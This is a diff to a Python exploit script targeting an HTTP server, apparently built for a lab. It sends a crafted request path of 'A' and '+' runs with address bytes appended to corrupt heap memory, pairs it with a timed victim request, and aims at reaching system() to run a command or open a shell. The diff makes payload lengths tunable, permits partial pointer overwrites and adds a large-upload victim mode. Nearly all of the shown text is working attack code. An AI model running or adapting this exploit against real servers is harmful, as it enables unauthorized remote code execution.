@@ -7,6 +7,8 @@ import sys
 
 BODY_LEN = 4000
 N_SPRAY = 20
+DEFAULT_A_COUNT = 349
+DEFAULT_PLUS_COUNT = 969
 
 SAFE = set()
 _t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
@@ -30,6 +32,10 @@ PREREAD_HEAP_OFFSETS = [
 
 def addr_is_safe(addr):
     return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))
+
+
+def addr_low_is_safe(addr, nbytes):
+    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(nbytes))
 
 
 def parse_addr(value):
@@ -59,7 +65,16 @@ def wait_alive(host, port, timeout=30):
     return False
 
 
-def attempt(host, port, target_bytes, body):
+def attempt(
+    host,
+    port,
+    target_bytes,
+    body,
+    upload_victim=False,
+    victim_body_len=65536,
+    a_count=DEFAULT_A_COUNT,
+    plus_count=DEFAULT_PLUS_COUNT,
+):
     sprays = []
     for i in range(N_SPRAY):
         try:
@@ -83,8 +98,6 @@ def attempt(host, port, target_bytes, body):
     try:
         a = socket.create_connection((host, port), timeout=5)
         time.sleep(0.02)
-        v = socket.create_connection((host, port), timeout=5)
-        time.sleep(0.02)
     except Exception:
         for s in sprays:
             try:
@@ -93,11 +106,38 @@ def attempt(host, port, target_bytes, body):
                 pass
         return False
 
-    payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
+    payload = "A" * a_count + "+" * plus_count + target_bytes.decode("latin-1")
     a.sendall((f"GET /api/{payload} HTTP/1.1\r\n"
                f"Host:localhost\r\n").encode("latin-1"))
     time.sleep(0.05)
-    v.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
+
+    try:
+        v = socket.create_connection((host, port), timeout=5)
+        time.sleep(0.02)
+    except Exception:
+        for s in sprays:
+            try:
+                s.close()
+            except Exception:
+                pass
+        try:
+            a.close()
+        except Exception:
+            pass
+        return False
+
+    if upload_victim:
+        victim_body = b"V" * victim_body_len
+        v.sendall(
+            b"POST /victim_upload HTTP/1.1\r\n"
+            b"Host:localhost\r\n"
+            b"X-Delay:60\r\n"
+            b"Content-Length: " + str(len(victim_body)).encode() + b"\r\n"
+            b"Connection: close\r\n"
+            b"\r\n" + victim_body
+        )
+    else:
+        v.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
     time.sleep(0.05)
     a.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
     time.sleep(0.2)
@@ -163,6 +203,16 @@ def main():
                         help=f"libc base address for this lab (default: {DEFAULT_LIBC_BASE:#x})")
     parser.add_argument("--system-addr", type=parse_addr,
                         help="absolute system() address; overrides --libc-base")
+    parser.add_argument("--target-len", type=int, default=6,
+                        help="number of low address bytes to overwrite (default: 6)")
+    parser.add_argument("--a-count", type=int, default=DEFAULT_A_COUNT,
+                        help=f"literal A prefix length (default: {DEFAULT_A_COUNT})")
+    parser.add_argument("--plus-count", type=int, default=DEFAULT_PLUS_COUNT,
+                        help=f"literal plus run length (default: {DEFAULT_PLUS_COUNT})")
+    parser.add_argument("--upload-victim", action="store_true",
+                        help="use a large upload victim request with a real pool cleanup")
+    parser.add_argument("--victim-body-len", type=int, default=65536,
+                        help="body length for --upload-victim (default: 65536)")
     args = parser.parse_args()
 
     if not args.cmd and not args.shell:
@@ -199,10 +249,13 @@ def main():
         # Give the listener a moment to start
         time.sleep(1)
 
+    if args.target_len < 1 or args.target_len > 6:
+        parser.error("--target-len must be between 1 and 6")
+
     candidates = []
     for i, off in enumerate(PREREAD_HEAP_OFFSETS):
         addr = heap_base + off
-        if addr_is_safe(addr):
+        if addr_low_is_safe(addr, args.target_len):
             candidates.append((i, addr))
 
     primary_addr = candidates[0][1]
@@ -218,7 +271,7 @@ def main():
     TRIES_PER_CANDIDATE = 10
 
     for i, addr in candidates:
-        target = bytes([(addr >> (j * 8)) & 0xff for j in range(6)])
+        target = bytes([(addr >> (j * 8)) & 0xff for j in range(args.target_len)])
 
         for t in range(TRIES_PER_CANDIDATE):
             if not wait_alive(host, port, timeout=10):
@@ -227,7 +280,16 @@ def main():
                     print("    server not recovering, aborting")
                     return 1
 
-            crashed = attempt(host, port, target, body)
+            crashed = attempt(
+                host,
+                port,
+                target,
+                body,
+                upload_victim=args.upload_victim,
+                victim_body_len=args.victim_body_len,
+                a_count=args.a_count,
+                plus_count=args.plus_count,
+            )
             if crashed:
                 if args.shell:
                     try:
